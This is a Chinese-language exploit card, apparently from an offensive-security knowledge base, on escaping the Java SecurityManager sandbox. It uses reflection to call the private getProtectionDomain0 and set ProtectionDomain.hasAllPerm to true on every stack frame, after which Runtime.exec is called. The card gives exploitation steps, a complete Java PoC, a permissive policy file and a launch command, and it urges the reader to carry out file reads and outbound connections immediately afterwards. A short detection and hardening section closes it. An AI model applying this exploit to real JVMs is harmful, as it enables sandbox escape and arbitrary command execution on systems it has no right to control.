---
id: binary-pwn-sandbox-escape-protectiondomain-hasallperm-reflection
title: 反射改 ProtectionDomain.hasAllPerm：让当前栈帧越过 SecurityManager 权限检查
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: protectiondomain-hasallperm-reflection-set
aliases:
- hasAllPerm 反射置 true
- getProtectionDomain0 反射
- ProtectionDomain 全权限
- 栈帧遍历改权限域
- 反射绕过 SecurityManager
tags:
- java
- sandbox-escape
- securitymanager
- reflection
- protectiondomain
- accesscontroller
- stackframe
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3
  verified_at: '2026-11-08T00:38:39+08:00'
  notes: 已对照原文核对：原文「通过调试发现反射直接运行 getProtectionDomain0() 绕过 getProtectionDomain() 过滤」「遍历栈帧对每个类取私有 getProtectionDomain0、反射把 pd 的 hasAllPerm 置 true，再 Runtime.exec」与卡内 PoC 代码逐段一致（含 clz.getClass().getDeclaredMethod 的取法、StackTraceElement 遍历、异常吞掉）；my.policy 授予 suppressAccessChecks+accessDeclaredMembers 与卡内策略块一致。卡内已按 JDK 版本不确定性标 confidence=medium。未验证点：未在 JDK8 复跑、hasAllPerm 字段名与可反射性未按具体 JDK 版本实证（JDK9+ 强封装下可能需要 --add-opens，原文未涉及）。
---

## 一句话结论

`AccessController` 做权限判定时会沿调用栈从下往上检查每一帧所属类的 `ProtectionDomain`；`ProtectionDomain` 内部有一个 `hasAllPerm` 布尔位置（当该域持有 `AllPermission` 时为真，检查器会短路放行）。当沙箱允许反射时，可以遍历当前线程栈帧、对每一帧的类拿到其 `ProtectionDomain`（绕过公共 `getProtectionDomain()` 上的 `getProtectionDomain` 权限检查，走私有的 `getProtectionDomain0()`），再用反射把 `hasAllPerm` 置 `true`，于是后续 `Runtime.exec` 的权限检查在所有相关栈帧上都被短路放行。

## 原理

- `AccessController.checkPermission` 的核心是 `getStackAccessControlContext()` 返回的上下文里逐个 `ProtectionDomain` 检查：若某域的 `hasAllPerm` 为真，直接视为通过；否则再按 `PermissionCollection` 逐个判定。`hasAllPerm` 是域对象里的缓存/快捷标志，不是不可变字段。
- 公共方法 `Class.getProtectionDomain()` 本身要 `RuntimePermission("getProtectionDomain")`；但 JDK 内部还有私有的 `getProtectionDomain0()`（返回域但不做该检查），反射调用它即可在无该权限时拿到域对象。
- 拿到域后，`ProtectionDomain` 的 `hasAllPerm` 是私有字段；`setAccessible(true)` 后 `set(pd, true)` 即可把该域标记为「持有全权限」。由于检查器短路，该域及其调用链上的检查全部放行。
- 只改「当前类」的域不够：`AccessController` 检查的是**整条栈**，所以 PoC 才遍历 `Thread.currentThread().getStackTrace()` 里出现过的每个类、逐个尝试改域；把调用链上所有域都标成 `hasAllPerm` 后，`Runtime.exec` 的 `checkExec` 才会在每一帧都短路通过。
- 前置是「反射权限」：需要 `RuntimePermission("accessDeclaredMembers")` 与 `ReflectPermission("suppressAccessChecks")`（或等价宽泛授权），否则 `getDeclaredMethod`/`setAccessible` 就被拒。
- 与 `doPrivileged` 的区别：`doPrivileged` 是合法地「截断栈」让上层帧不参与检查；本卡是伪造域标志让检查器以为每帧都有全权限，属于绕过而非合法使用。

## 触发条件

- JVM 启用 SecurityManager，且目标操作（如 `Runtime.exec`）原本被策略拒绝。
- 策略授予反射权限（`accessDeclaredMembers` + `suppressAccessChecks`），或授予了宽泛的 `RuntimePermission`/`AllPermission` 子集。
- 目标 JDK 的 `ProtectionDomain` 仍使用 `hasAllPerm` 这一字段（JDK 8 系列成立；高版本字段名/实现可能变化，需按版本核对）。
- 攻击者能在该 JVM 内执行任意 Java 代码。

## 利用步骤

1. 触发一次被拒操作（如 `Runtime.exec`），确认抛 `AccessControlException` 且原因是 `FilePermission ... "execute"`。
2. 遍历 `Thread.currentThread().getStackTrace()`，对每个 `StackTraceElement` 用 `Class.forName(className)`。
3. 对每个类反射取私有 `getProtectionDomain0`（无参），`setAccessible(true)` 后 invoke 得到 `ProtectionDomain`。
4. 对返回的域反射取私有字段 `hasAllPerm`，`setAccessible(true)` 后 `set(pd, true)`。
5. 再次执行原本被拒的命令；若仍被拒，说明栈上还有未覆盖的域（例如新起线程/框架类），扩大遍历范围或对新线程重复该步骤。
6. 成功后立刻完成后续敏感操作（读文件、外连、写文件），因为该修改是进程级、持续生效的。

## PoC

```java
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;

public class BypassSandbox {
    public static void main(String[] args) throws Exception {
        setHasAllPerm0("calc");
    }

    public static void setHasAllPerm0(String command) throws Exception {
        StackTraceElement[] frames = Thread.currentThread().getStackTrace();
        for (StackTraceElement f : frames) {
            try {
                Class<?> clz = Class.forName(f.getClassName());
                Method getPd0 = clz.getClass()
                        .getDeclaredMethod("getProtectionDomain0", (Class<?>[]) null);
                getPd0.setAccessible(true);
                ProtectionDomain pd = (ProtectionDomain) getPd0.invoke(clz);
                if (pd != null) {
                    Field f2 = pd.getClass().getDeclaredField("hasAllPerm");
                    f2.setAccessible(true);
                    f2.set(pd, true);      // 标记该域持有 AllPermission
                }
            } catch (Exception ignored) {
                // 某些帧的类没有该方法/字段，跳过
            }
        }
        Runtime.getRuntime().exec(command);
    }
}
```

```text
# 策略（仅授予反射权限，故意不给 execute）
grant {
    permission java.lang.reflect.ReflectPermission "suppressAccessChecks";
    permission java.lang.RuntimePermission "accessDeclaredMembers";
};
```

```bash
java -Djava.security.manager -Djava.security.policy="my.policy" BypassSandbox
```

## 变体与关联

- 变体：只改当前类的域往往不够，需覆盖整条栈；若 `exec` 在子线程执行，子线程 `run` 方法所在类与 `Thread` 相关域也要覆盖。
- 变体：JDK 版本字段名变化时（如换成 `staticPermissions`/`dynamicPermissions` 结构），需按反射探测实际字段名；本卡以 `hasAllPerm` 为典型目标。
- 关联：`[[binary-pwn-sandbox-escape-processbuilder-checkexec-reflection-skip]]` 是反射直呼下层实现跳过检查（不改权限域）；`[[binary-pwn-sandbox-escape-java-setsecuritymanager-null-disable]]` 是直接卸载管理器；`[[binary-pwn-sandbox-escape-java-policy-single-equals-home-policy-self-grant]]` 是改策略文件扩权。
- 边界：策略不给反射权限、JDK 已把该字段改为不可反射/不存在、栈上存在来自未覆盖类加载器的帧、`SecurityManager` 换成自定义实现走了不同判定逻辑时，可能失败（故置信度 medium）。

## 检测与防御

- 检测：代码反射调用 `getProtectionDomain0`；对 `ProtectionDomain` 的 `hasAllPerm` 字段做 `setAccessible`+`set`；`Runtime.exec` 前出现大量栈帧遍历 + `Class.forName`。
- 修复：不授予 `suppressAccessChecks`/`accessDeclaredMembers`；启动时用 `sun.reflect.Reflection.registerFieldsToFilter(ProtectionDomain.class, "hasAllPerm")` 与 `registerMethodsToFilter(Class.class, "getProtectionDomain0")` 把敏感成员加入反射黑名单。
- 加固：把隔离边界下沉到进程/容器级（低权限账号 + seccomp/AppArmor），不要只依赖 JVM 内 SecurityManager；对沙箱进程监控进程创建与外连。
